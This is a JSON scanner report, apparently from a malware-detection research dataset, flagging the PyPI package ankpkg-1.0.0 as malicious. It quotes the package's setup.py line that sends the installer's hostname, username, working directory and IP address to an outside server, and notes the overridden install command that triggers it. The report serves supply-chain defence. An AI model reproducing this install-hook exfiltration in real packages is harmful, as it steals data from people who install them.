{
  "package_name": "ankpkg-1.0.0",
  "total_matches": 2,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/ankpkg-1.0.0/ankpkg-1.0.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 2,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code defines a custom installation command for a Python package. During installation (i.e., when someone runs 'pip install' or similar), it collects sensitive information from the user's system, including the hostname, current working directory, username, fully qualified domain name, and IP address. It then sends this information via an HTTP GET request to an external server (https://cas54n1gfihn6082nil0kz451ubndy6rt.dooracle.in). This is a classic example of data exfiltration, which is a common malicious behavior in supply chain attacks. The use of a custom install command to trigger this behavior is also a known technique for hiding malicious payloads in Python packages.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "18",
          "type_description": "exfiltrate-sensitive-data: found 1 source code matches",
          "code_snippet": "requests.get(\"https://cas54n1gfihn6082nil0kz451ubndy6rt.dooracle.in\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream",
          "full_match": "* This package is exfiltrating sensitive data to a remote server at ankpkg-1.0.0/setup.py:18",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/ankpkg-1.0.0/ankpkg-1.0.0/setup.py",
          "relative_path": "ankpkg-1.0.0/setup.py"
        },
        {
          "line_number": "21",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(name='ankpkg', #package name\nversion='1.0.0',\ndescription='test',\nauthor='test',\nlicense='MIT',\nzip_safe=False,\ncmdclass={'install': CustomInstall})",
          "full_match": "* This package is overwriting the 'install' command in setup.py at ankpkg-1.0.0/setup.py:21",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/ankpkg-1.0.0/ankpkg-1.0.0/setup.py",
          "relative_path": "ankpkg-1.0.0/setup.py"
        }
      ]
    }
  ]
}